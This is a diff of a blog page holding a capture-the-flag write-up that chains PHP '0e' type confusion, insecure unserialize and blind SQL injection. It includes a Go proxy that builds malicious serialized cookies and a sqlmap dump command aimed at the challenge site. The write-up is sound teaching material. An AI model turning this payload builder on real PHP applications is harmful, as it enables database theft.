@@ -1,98 +1,50 @@
 <!DOCTYPE html>
-<html
-  class=""
-  lang="en-us"
-  prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#"
->
-  <head>
-    <meta charset="utf-8" />
+<html>
 
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-<meta name="description" content="" />
-<meta name="HandheldFriendly" content="True" />
-<meta name="MobileOptimized" content="320" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<title> Cereal Logger &middot; ramblings of an aspiring hacker </title>
 
 
-<meta name="keywords" content="">
+<link rel="stylesheet" href="https://ejohn.github.io/css/slim.css">
+<link rel="stylesheet" href="https://ejohn.github.io/css/highlight.min.css">
+<link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Source+Code+Pro' rel='stylesheet' type='text/css'>
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/favicon.ico">
 
 
-<meta property="og:type" content="article" />
-<meta property="og:description" content="" />
-<meta property="og:title" content="Cereal Logger" />
-<meta property="og:site_name" content="ramblings of an aspiring hacker" />
-<meta property="og:image" content="" />
-<meta property="og:image:type" content="image/jpeg" />
-<meta property="og:image:width" content="" />
-<meta property="og:image:height" content="" />
-<meta property="og:url" content="https://ejohn.github.io/posts/cereal-logger/" />
-<meta property="og:locale" content="en-us" />
-<meta property="article:published_time" content="2020-05-27
-" /> <meta property="article:modified_time" content="2020-05-27
-" />
+<link href="" rel="alternate" type="application/rss+xml" title="ramblings of an aspiring hacker" />
 
+</head>
 
+<body>
+  <div class="container">
+    <div class="header">
+  <h1 class="site-title"><a href="https://ejohn.github.io/">ramblings of an aspiring hacker</a></h1>
+  <p class="site-tagline"></p>
+  <div class="nav">
+    <a class="nav-btn" href="#">
+      <span class="ci ci-burger"></span>
+    </a>
+    <ul class="nav-list">
+       
+	  <li class="spacer">&ac;</li>
 
-
-
-
-    <title>Cereal Logger</title>
-    <link rel="canonical" href="https://ejohn.github.io/posts/cereal-logger/" />
-
-
-    <link
-  rel="stylesheet"
-  href="https://unpkg.com/tachyons@4.11.1/css/tachyons.min.css"
-/>
-
-<link rel="stylesheet" href="https://ejohn.github.io/css/style.css" />
-
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/highlightjs@9.12.0/styles/monokai-sublime.css"
-/>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44281103-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
-  </head>
-
-
-<body
-  lang="en-us"
-  class="sans-serif w-90 w-60-ns center center-ns mv2 mv5-ns"
-  itemscope
-  itemtype="http://schema.org/Article"
->
-  
-  <span class="b">/ </span>
-  <a
-    href="https://ejohn.github.io/"
-    class="b bb bw1 pb1 no-underline black"
-    >ramblings of an aspiring hacker</a
-  >
-
-  <section id="main" class="mt5">
-    <h1 itemprop="name" id="title">Cereal Logger</h1>
-
-    <article itemprop="articleBody" id="content" class="w-90 lh-copy">
-      <p>I recently came across <a href="https://twitter.com/247CTF/status/1262715256234631170">this</a> challenge on twitter.</p>
-<p><img src="images/DDBF4151-82F6-49F6-9035-5B8BF4E3FABA%202.png" alt=""></p>
+      <li><a href="https://github.com/ejohn">Github</a></li>  
+    </ul>
+  </div>
+</div>
+    <div class="content">
+      <div class="post">
+        <h2 class="post-title"><a href="https://ejohn.github.io/posts/cereal-logger/">Cereal Logger</a></h2>
+        <div class="post-content">
+          <p>I recently came across <a href="https://twitter.com/247CTF/status/1262715256234631170">this</a> challenge on twitter.
+<img src="images/DDBF4151-82F6-49F6-9035-5B8BF4E3FABA%202.png" alt=""></p>
 <p>Write to <code>/dev/null</code> using a special cookie to read a flag! That intrigued me enough to sign up on 247ctf.com and take a crack at it myself.</p>
-<p>This is what the challenge looks like once you start playing.</p>
-<p><img src="images/u6_3XkEvUD0cR26HLRtGhFumdiCvnZ3wdM0HDOCmzbKZ5ANaQUV-XpgwYCUng2q_Sik6vqkEM1HGo4Y4vDS2CenZtZnN0Le0RqzqFyU1OC9wz9ujGLDW_51CcYRmTK-9FBH8CWbo%202.png" alt=""></p>
+<p>This is what the challenge looks like once you start playing.
+<img src="images/u6_3XkEvUD0cR26HLRtGhFumdiCvnZ3wdM0HDOCmzbKZ5ANaQUV-XpgwYCUng2q_Sik6vqkEM1HGo4Y4vDS2CenZtZnN0Le0RqzqFyU1OC9wz9ujGLDW_51CcYRmTK-9FBH8CWbo%202.png" alt=""></p>
 <p>The code starts with an <code>insert_log</code> class which does some really questionable things but let’s come back to that later. The <code>if</code> statements are where the fun begins.</p>
 <p>It looks like we need to set a cookie with the name <code>247</code> for the server to do anything interesting.  Otherwise we just get the syntax highlighted code for the current page. From the looks of it, we are currently hitting this flow.</p>
 <p>Let’s try to take the more interesting path by satisfying the condition for the <code>if</code> statement.</p>
@@ -103,15 +55,15 @@ if (!doNotTrack) {
 <p>Let’s break this down. Suppose the value of the <code>247</code> cookie is <code>foo.bar</code>. The <code>explode</code>  extracts the second part <code>bar</code> after splitting on <code>.</code>. <code>bar</code> is then concatenated with a random value between  <code>0</code> and <code>247247247</code> . This value is then checked to see if it is <code>==</code> to <code>0</code>.</p>
 <p>At first glance this looks impossible! How can a <code>string + random number</code> be equal to <code>0</code>!
 <img src="images/C3EC44C3-C50C-42ED-B6EA-8288C08480FB%202.png" alt=""></p>
-<p>I don’t have a PHP dev environment handy so let’s use an online IDE. I am new to PHP but not new to weirdness involving equality operators! Let’s investigate if that is the case. My google-fu quickly got me to <a href="https://stackoverflow.com/questions/3333353/string-comparison-using-vs-strcmp">this</a> stack overflow answer.</p>
-<p><img src="images/F65272D6-B287-4734-A88A-B0A9CA8DA2E6%202.png" alt=""></p>
-<p>Boom! This is exactly what we want! Let’s test out this theory.</p>
-<p><img src="images/php-typeconfusion.png" alt=""></p>
+<p>I don’t have a PHP dev environment handy so let’s use an online IDE. I am new to PHP but not new to weirdness involving equality operators! Let’s investigate if that is the case. My google-fu quickly got me to <a href="https://stackoverflow.com/questions/3333353/string-comparison-using-vs-strcmp">this</a> stack overflow answer.
+<img src="images/F65272D6-B287-4734-A88A-B0A9CA8DA2E6%202.png" alt=""></p>
+<p>Boom! This is exactly what we want! Let’s test out this theory.
+<img src="images/php-typeconfusion.png" alt=""></p>
 <p>Let me unpack what’s going on here.  According to the stack overflow answer, php tries to convert strings that start with an exponent notation to a float when the <code>==</code> operator is used.  Since we want the conversion to result in a <code>0</code> we start the string with <code>0e</code>. What follows <code>0e</code> does not matter since <code>0</code> multiplied by any other number is still <code>0</code>. See <a href="https://www.nyu.edu/pages/mathmol/textbook/scinot.html">this</a> for more information on scientific exponent notation.</p>
-<p>So now we have a way to satisfy the first check. Let’s test it out against the challenge site</p>
-<p><img src="images/3BAD5CF8-2184-46D5-8B7F-E9ABA90B04B8%202.png" alt=""></p>
-<p>Looks like it worked! Notice the <code>Content-Length</code> is <code>0</code>.  We do not expect any response from the server since the server just tries to write something to <code>/dev/null</code> and returns nothing. You can confirm this by calling the endpoint without a cookie and see that it responds with a lot more content.</p>
-<p><img src="images/6D7A4C30-5A29-41A8-9768-7C5BD4317B78%202.png" alt=""></p>
+<p>So now we have a way to satisfy the first check. Let’s test it out against the challenge site
+<img src="images/3BAD5CF8-2184-46D5-8B7F-E9ABA90B04B8%202.png" alt=""></p>
+<p>Looks like it worked! Notice the <code>Content-Length</code> is <code>0</code>.  We do not expect any response from the server since the server just tries to write something to <code>/dev/null</code> and returns nothing. You can confirm this by calling the endpoint without a cookie and see that it responds with a lot more content.
+<img src="images/6D7A4C30-5A29-41A8-9768-7C5BD4317B78%202.png" alt=""></p>
 <p>Ok, so now we have successfully bypassed the first stage of this challenge! Let’s see what is going on in the next line.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">file_put_contents(&#34;/dev/null&#34;, unserialize(base64_decode(explode(&#34;.&#34;, $_COOKIE[&#34;247&#34;])[0])));
 </code></pre></div><p>The server <code>explode</code>s the cookie value on <code>.</code> and uses the first chunk to base 64 decode and then deserialize into an object. All alarm bells should be going off in your head right now! User supplied data is passed directly into an <code>unserialize</code> call!  Deserializing untrusted data is a recipe for disaster, take a look <a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">here</a> for more information.</p>
@@ -124,8 +76,8 @@ if (!doNotTrack) {
 	$this-&gt;pdo-&gt;exec(“INSERT INTO log (message) VALUES (‘”.$this-&gt;new_data.”’);”);
 }
 </code></pre></div><p>This <code>__destruct</code> function is called when there are no more references left to a particular instance of <code>insert_log</code> class. At first glance, it is obvious that this function is vulnerable to SQL injection if we can control the <code>new_data</code>  field. But <code>new_data</code> is always assigned a value of <code>valid access logged</code>! Is there a way around that? If only there was a way to create a new instance of <code>insert_log</code> with an arbitrary <code>new_data</code> value. And that is exactly what the insecure <code>unserialize</code>  call gives us.</p>
-<p>Let’s figure out a way to generate a serialized payload to feed into this <code>unserialize</code> call. We can use php to do the heavy lifting for us and generate the payload.</p>
-<p><img src="images/AF8A67D5-6D07-44B7-A678-79C6E5F9C65C.png" alt=""></p>
+<p>Let’s figure out a way to generate a serialized payload to feed into this <code>unserialize</code> call. We can use php to do the heavy lifting for us and generate the payload.
+<img src="images/AF8A67D5-6D07-44B7-A678-79C6E5F9C65C.png" alt=""></p>
 <p>In this example, we redefine the <code>insert_log</code> class with an arbitrary <code>new_data</code> value and then serialize it
 followed by base64 encoding it.</p>
 <p>Next we need to come up with a SQL injection payload that will work in this situation.</p>
@@ -161,64 +113,69 @@ followed by base64 encoding it.</p>
 </code></pre></div><p>However I was having trouble getting this to work reliably for this challenge. Let’s try a different way.</p>
 <p>We can create an HTTP proxy server that listens on localhost and accepts requests with a specific query parameter that sqlmap can test against. Once the server receives this request with a query value, it transforms the payload and forwards the request to the challenge site. The proxy will then forward the response from the challenge site back to sqlmap. Simple enough!</p>
 <p>Go is my go to language for something like this. I have uploaded the full code for the proxy <a href="https://gist.github.com/ejohn/4d2169b7087515cf07ab6c00075e147c">here</a>, but here are the highlights.</p>
-<pre><code>// errors ignored for sake of brevity, see full code
-func main() {
-	mux := http.NewServeMux()
-	mux.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
-		payload := r.URL.Query().Get(&quot;sql&quot;)
-		resp, _ := challenge(payload)
-		body, _ := ioutil.ReadAll(resp.Body)
-		w.Write(body)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// errors ignored for sake of brevity, see full code
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	<span style="color:#a6e22e">mux</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">NewServeMux</span>()
+	<span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+		<span style="color:#a6e22e">payload</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>().<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;sql&#34;</span>)
+		<span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">challenge</span>(<span style="color:#a6e22e">payload</span>)
+		<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>)
+		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">body</span>)
 	})
-	log.Fatal(http.ListenAndServe(&quot;127.0.0.1:9001&quot;, mux))
+	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;127.0.0.1:9001&#34;</span>, <span style="color:#a6e22e">mux</span>))
 }
 
-func challenge(payload string) (*http.Response, error) {
-	req, _ := http.NewRequest(&quot;GET&quot;, &quot;https://challenge.247ctf.com/&quot;, nil)
-	cookie := get247cookie(payload)
-	req.AddCookie(cookie)
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">challenge</span>(<span style="color:#a6e22e">payload</span> <span style="color:#66d9ef">string</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Response</span>, <span style="color:#66d9ef">error</span>) {
+	<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">NewRequest</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;https://challenge.247ctf.com/&#34;</span>, <span style="color:#66d9ef">nil</span>)
+	<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">get247cookie</span>(<span style="color:#a6e22e">payload</span>)
+	<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">AddCookie</span>(<span style="color:#a6e22e">cookie</span>)
 
-	return http.DefaultClient.Do(req)
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">DefaultClient</span>.<span style="color:#a6e22e">Do</span>(<span style="color:#a6e22e">req</span>)
 }
 
-func get247cookie(payload string) *http.Cookie {
-	b64serialized := base64.StdEncoding.EncodeToString([]byte(serialize(payload)))
-	cookie := http.Cookie{
-		Name:  &quot;247&quot;,
-		Value: fmt.Sprintf(&quot;%s.0e&quot;, b64serialized),
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">get247cookie</span>(<span style="color:#a6e22e">payload</span> <span style="color:#66d9ef">string</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Cookie</span> {
+	<span style="color:#a6e22e">b64serialized</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">StdEncoding</span>.<span style="color:#a6e22e">EncodeToString</span>([]byte(<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">payload</span>)))
+	<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Cookie</span>{
+		<span style="color:#a6e22e">Name</span>:  <span style="color:#e6db74">&#34;247&#34;</span>,
+		<span style="color:#a6e22e">Value</span>: <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%s.0e&#34;</span>, <span style="color:#a6e22e">b64serialized</span>),
 	}
-	return &amp;cookie
+	<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">cookie</span>
 }
 
-func serialize(payload string) string {
-	template := &quot;O:10:\&quot;insert_log\&quot;:1:{s:8:\&quot;new_data\&quot;;s:%d:\&quot;%s\&quot;;}&quot;
-	return fmt.Sprintf(template, len(payload), payload)
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">payload</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span> {
+	<span style="color:#a6e22e">template</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;O:10:\&#34;insert_log\&#34;:1:{s:8:\&#34;new_data\&#34;;s:%d:\&#34;%s\&#34;;}&#34;</span>
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#a6e22e">template</span>, len(<span style="color:#a6e22e">payload</span>), <span style="color:#a6e22e">payload</span>)
 }
-</code></pre><p>All that is left is to point sqlmap at our local server and let it do its job. After some experimentation, this is the sqlmap invocation that worked for me.
-<code>./sqlmap.py -u 'http://127.0.0.1:9001?sql=test' -p &quot;sql&quot; --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent</code></p>
-<p><img src="images/D0208EFB-653B-4F03-A46A-292A72343F12.png" alt=""></p>
+</code></pre></div><p>All that is left is to point sqlmap at our local server and let it do its job. After some experimentation, this is the sqlmap invocation that worked for me.</p>
+<pre><code>./sqlmap.py -u 'http://127.0.0.1:9001?sql=test' -p &quot;sql&quot; --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent
+</code></pre><p><img src="images/D0208EFB-653B-4F03-A46A-292A72343F12.png" alt=""></p>
 <p>As you can see in the screenshot, sqlmap identified an injection payload that worked reliably to extract data. It found two tables, flag and log in the database. A bit further down in the output, sqlmap spits this out!
 <img src="images/37624E44-61BE-44FF-8002-02451F74F688.png" alt=""></p>
 <p>And there you have it! That was a fun challenge that chained a lot of different vulnerabilities, <a href="https://www.sjoerdlangkemper.nl/2018/07/04/type-confusion-in-monstra-cms/">type confusion</a>, insecure deserialization and blind SQL injection!</p>
 
-    </article>
-  </section>
-
-  <footer>
-    <div>
-      <p class="f6 gray mt6 lh-copy">
-        
-      </p>
+        </div>
+      </div>
     </div>
-  </footer>
+    <div class="footer">
   
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+  <p>-</p>
+  
+</div>
 
-<script>
-  hljs.initHighlightingOnLoad();
+  </div>
+  <script src="https://ejohn.github.io/js/slim.js"></script>
+  <script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-44281103-1', 'auto');
+ga('send', 'pageview');
+
 </script>
 
 
+</body>
 
-  </body>
 </html>
